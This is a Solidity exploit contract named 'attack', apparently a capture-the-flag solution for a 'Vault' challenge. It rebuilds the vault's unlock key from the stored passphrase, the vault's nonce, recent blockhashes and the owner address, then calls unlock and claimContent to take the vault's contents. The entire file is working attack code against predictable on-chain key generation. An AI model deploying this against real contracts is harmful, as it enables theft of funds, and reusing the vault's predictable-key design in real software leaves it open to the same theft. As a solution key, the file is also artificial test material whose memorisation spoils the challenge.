// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Importing the Vault contract to interact with it.
import "./Vault.sol";

contract attack {
    // Storing the instance of the Vault contract we want to interact with.
    Vault public vault;
    
    // Storing the passphrase for unlocking the vault.
    bytes32 public passphrase;
    
    // Nonce used for key generation.
    uint256 nonce;

    // Constructor that sets the address of the Vault and passphrase.
    constructor(address _vault, bytes32 _passphrase) {
        vault = Vault(_vault);
        passphrase = _passphrase;
    }

    // Function for generating a 'magic' password, used for unlocking the vault.
    function _magicPassword() private returns (bytes8) {
        // Generating two keys with different reductors.
        uint256 _key1 = _generateKey((block.timestamp % 2) + 1);
        uint128 _key2 = uint128(_generateKey(2));

        // XORing the passphrase with _key1, and then XORing that result with _key2.
        bytes8 _secret = bytes8(bytes16(uint128(uint128(bytes16(bytes32(uint256(uint256(passphrase) ^ _key1)))) ^ _key2)));

        // Returning the secret after some bit manipulation.
        return ((_secret >> 32) | (_secret << 16));
    }

    // Function to generate a key, uses nonce and blockhash.
    function _generateKey(uint256 _reductor) private returns (uint256 ret) {
        // Creating a key based on the hash of a previous block and the current nonce.
        ret = uint256(keccak256(abi.encodePacked(uint256(blockhash(block.number - _reductor)) + nonce)));

        // Incrementing the nonce for the next key generation.
        nonce++;
    }

    // Public function to unlock the vault.
    function unlock() public {
        // Setting the nonce to be the same as the Vault's nonce.
        nonce = vault.nonce();

        // Generating the 'magic' password and extracting the most significant bits.
        uint128 _secretKey = uint128(bytes16(_magicPassword()) >> 64);

        // Getting the least significant bits of the owner's address.
        uint128 _owner = uint128(uint64(uint160(vault.owner())));

        // Unlocking the vault with the concatenated owner and secret key.
        vault.unlock(bytes16((_owner << 64) | _secretKey));

        // Claiming the content of the Vault.
        vault.claimContent();
    }
}